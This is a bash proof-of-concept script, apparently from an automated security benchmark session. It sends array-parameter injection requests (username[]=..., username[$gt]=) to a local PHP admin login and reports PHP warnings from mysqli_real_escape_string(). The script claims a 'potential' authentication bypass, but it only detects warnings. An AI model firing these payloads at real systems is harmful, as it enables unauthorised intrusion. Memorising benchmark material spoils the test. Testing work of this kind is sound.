#!/bin/bash
# POC: Type Juggling Vulnerability in Admin Authentication - Array Parameter Injection. Demonstrates how passing array parameters to mysqli_real_escape_string() causes PHP warnings and type juggling, potentially bypassing authentication checks.
# Target: ./repo
# Created: 2025-11-07T21:47:40.665Z
# Session: benchmark-XBEN-078-24-mhpdbdxp

# Type Juggling Vulnerability in Admin Authentication POC
# Target: admin.php - Array parameter injection to mysqli_real_escape_string()

TARGET="http://localhost:8080"
ADMIN_ENDPOINT="/admin.php"
FULL_URL="${TARGET}${ADMIN_ENDPOINT}"

echo "=========================================="
echo "Type Juggling Admin Auth POC"
echo "=========================================="
echo ""
echo "Target: $FULL_URL"
echo ""

# Test 1: Standard login attempt (baseline)
echo "[*] Test 1: Standard login attempt (baseline)"
RESPONSE=$(curl -s -X POST "$FULL_URL" \
  -d 'username=admin&password=wrongpass' \
  -H "Content-Type: application/x-www-form-urlencoded")

echo "Response status check:"
if echo "$RESPONSE" | grep -q "Warning.*mysqli_real_escape_string"; then
  echo "✓ PHP Warning detected (information disclosure)"
  echo "$RESPONSE" | grep "Warning.*mysqli_real_escape_string"
else
  echo "- No warning in baseline (expected)"
fi
echo ""

# Test 2: Array parameter injection - This triggers the type juggling vulnerability
echo "[*] Test 2: Array parameter injection (type juggling attack)"
echo "Sending: username[]=value&password[]=value"
echo ""

RESPONSE=$(curl -s -X POST "$FULL_URL" \
  -d 'username[]=value&password[]=value' \
  -H "Content-Type: application/x-www-form-urlencoded")

echo "Response received:"
if echo "$RESPONSE" | grep -q "Warning.*mysqli_real_escape_string"; then
  echo "✓ VULNERABLE: PHP Warning detected!"
  echo ""
  echo "Warning Output:"
  echo "$RESPONSE" | grep "Warning.*mysqli_real_escape_string"
  echo ""
  echo "This warning indicates:"
  echo "1. Array parameter was passed to mysqli_real_escape_string()"
  echo "2. Type juggling occurred - array converted to empty string"
  echo "3. No input type validation performed"
  echo ""
  VULN_FOUND=1
else
  echo "- No warning (may be suppressed in production)"
  VULN_FOUND=0
fi
echo ""

# Test 3: Alternative array syntax injection
echo "[*] Test 3: Alternative array syntax (nested array injection)"
echo "Sending: username[\$gt]=&password[\$gt]="
echo ""

RESPONSE=$(curl -s -X POST "$FULL_URL" \
  -d 'username[$gt]=&password[$gt]=' \
  -H "Content-Type: application/x-www-form-urlencoded")

if echo "$RESPONSE" | grep -q "Warning.*mysqli_real_escape_string"; then
  echo "✓ VULNERABLE: Type juggling with nested array syntax"
  echo ""
  echo "Warning Output:"
  echo "$RESPONSE" | grep "Warning.*mysqli_real_escape_string"
  VULN_FOUND=1
else
  echo "- No additional warning"
fi
echo ""

# Test 4: Multiple array elements
echo "[*] Test 4: Multiple array elements injection"
echo "Sending: username[0]=admin&username[1]=user&password[0]=pass"
echo ""

RESPONSE=$(curl -s -X POST "$FULL_URL" \
  -d 'username[0]=admin&username[1]=user&password[0]=pass' \
  -H "Content-Type: application/x-www-form-urlencoded")

if echo "$RESPONSE" | grep -q "Warning.*mysqli_real_escape_string"; then
  echo "✓ VULNERABLE: Multiple array elements trigger type juggling"
  echo ""
  echo "Warning Output:"
  echo "$RESPONSE" | grep "Warning.*mysqli_real_escape_string"
  VULN_FOUND=1
else
  echo "- No warning"
fi
echo ""

# Summary
echo "=========================================="
echo "POC Summary"
echo "=========================================="
if [ $VULN_FOUND -eq 1 ]; then
  echo "✓ Type Juggling Vulnerability CONFIRMED"
  echo ""
  echo "Vulnerability Details:"
  echo "- Application accepts array parameters where strings are expected"
  echo "- Arrays passed to mysqli_real_escape_string() trigger PHP warnings"
  echo "- This indicates missing input type validation"
  echo "- Type juggling: Array → Empty string, potentially bypassing auth"
  echo ""
  echo "Risk: An attacker could exploit this to:"
  echo "1. Cause denial of service through PHP warnings"
  echo "2. Potentially bypass authentication through type juggling"
  echo "3. Gain information about application code structure"
  exit 0
else
  echo "⚠ Vulnerability may be present but warnings are suppressed"
  echo "Check application error logs for PHP warnings"
  exit 1
fi